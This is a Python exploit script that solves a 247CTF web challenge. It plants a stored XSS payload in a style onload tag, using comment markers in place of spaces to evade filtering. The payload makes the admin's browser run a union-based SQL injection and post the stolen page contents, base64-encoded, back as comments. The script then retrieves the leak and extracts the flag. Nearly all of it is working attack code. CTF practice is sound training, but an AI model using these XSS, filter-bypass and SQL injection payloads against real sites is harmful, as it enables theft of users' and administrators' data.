import requests
import re
import base64

url = "https://a91678fa6cce40f9.247ctf.com"
s = requests.Session()

# exfil admin page
js = '''
x = new XMLHttpRequest();
x.open('GET', '/user/0', false);
x.send();

x2 = new XMLHttpRequest();
x2.open('POST', '/comment/2', false);
x2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x2.send('comment='+encodeURIComponent(btoa(x.responseText)));
'''.replace(' ', '/**/').replace('\n', '')

# xss + sqli
sqli = '-1 union select flag, 1, 1, 1, 1, 1 from flag --'

js = '''
x = new XMLHttpRequest();
x.open('POST', '/secret_admin_search', false);
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x.send('search=%s');

x2 = new XMLHttpRequest();
x2.open('POST', '/comment/2', false);
x2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x2.send('comment='+encodeURIComponent(btoa(x.responseText)));
'''.replace(' ', '/**/').replace('\n', '') % sqli

payload = '<style onload="%s">' % js

res = s.post(f'{url}/comment/1', data={ 
    'comment': payload
})

assert res.json()['result'] == 'success'
print("> Submitted payload")

# report
res = s.get(f'{url}/report/1')

assert res.json()['result'] == 'success'
print("> Reported payload")

# get exfil
res = s.get(f'{url}/user/2')

leak = re.findall(r'<hr class="my-4">.+?<p class="comment">(.+?)</p>', res.text.replace("\n", ''))[-1].strip()
leak = base64.b64decode(leak).decode()

flag = re.findall(r'(247CTF{.+?})', leak)[0].strip()
print("Flag:", flag)